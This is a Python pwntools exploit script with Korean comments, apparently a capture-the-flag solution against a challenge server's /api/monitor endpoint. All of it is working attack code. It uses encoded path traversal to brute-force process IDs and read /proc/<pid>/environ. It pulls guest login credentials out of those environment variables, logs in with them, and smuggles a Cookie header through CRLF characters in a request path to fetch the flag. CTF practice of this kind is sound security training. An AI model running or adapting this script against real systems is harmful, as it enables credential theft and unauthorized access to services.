#!/usr/bin/env python3
# -*- coding: utf-8 -*-
#
# /api/monitor 정보 유출 스크립트
#
# 1) 단일 세그먼트 파일 리스트 읽기
# 2) PID 1~5000 브루트 → /proc/<pid>/environ 탈취
# 3) 환경변수에서 GUEST_ID / GUEST_PWD 추출

from pwn import *
import re
from urllib.parse import quote

context.log_level = 'debug'

HOST = "hacktheon2025-challs-alb-1354048441.ap-northeast-2.elb.amazonaws.com"
PORT = 58709
BASE = f"http://{HOST}:{PORT}"

info_list = [
    "uptime", "idle-time", "cpu", "mem",
    "version", "cmdline", "cpuinfo", "meminfo",
    "stat", "diskstats", "loadavg"
]

def http_get(path):
    req = (
        f"GET {path} HTTP/1.1\r\n"
        f"Host: {HOST}:{PORT}\r\n"
        f"Connection: close\r\n\r\n"
    ).encode()
    io = remote(HOST, PORT, level='error')
    io.send(req)
    resp = io.recvall(timeout=5).decode(errors="ignore")
    io.close()
    status = int(resp.split()[1])
    body   = resp.split("\r\n\r\n", 1)[1] if "\r\n\r\n" in resp else ""
    return status, body

print("[*] 단일 세그먼트 파일 읽기")
for info in info_list:
    st, body = http_get(f"/api/monitor/{info}")
    if st == 200:
        print(f"--- {info} ---")
        print(body.strip()[:200] + ("..." if len(body) > 200 else ""))

print("\n[*] PID → /proc/<pid>/environ")
gid = gpw = None
for pid in range(1, 100): #5001RKwl
    path = f"/api/monitor/{quote(str(pid))}%2Fenviron"  # <pid>/environ
    st, body = http_get(path)
    print(body)
    if st == 200 and "GUEST_ID=" in body:
        print(f"[+] PID {pid} HIT!")
        gid = re.search(r"GUEST_ID=([^\0\n]+)", body).group(1)
        gpw = re.search(r"GUEST_PWD=([^\0\n]+)", body).group(1)
        print(f"GUEST_ID={gid}  GUEST_PWD={gpw}")
        break

    sleep(0.01)

if not gid:
    print("[-] 환경변수 탈취 실패")
    exit()

print("\n[*] guest / api/signin 테스트")
body = f'{{"username":"{gid}","password":"{gpw}"}}'
req = (
    "POST /api/signin HTTP/1.1\r\n"
    f"Host: {HOST}:{PORT}\r\n"
    "Content-Type: application/json\r\n"
    f"Content-Length: {len(body)}\r\n"
    "Connection: close\r\n\r\n"
    f"{body}"
).encode()
io = remote(HOST, PORT, level='error')
io.send(req)
resp = io.recvall(timeout=5).decode(errors="ignore")
io.close()
if " 200 " in resp and "Set-Cookie:" in resp:
    sid = re.search(r"Set-Cookie:\s*id=([^;]+)", resp).group(1)
    print(f"[+] 세션 획득 id={sid}")
    st, flag = http_get(f"/api/flag\r\nCookie: id={sid}\r\n")
    print("[FLAG]", flag.strip())
else:
    print("[-] 로그인 실패")
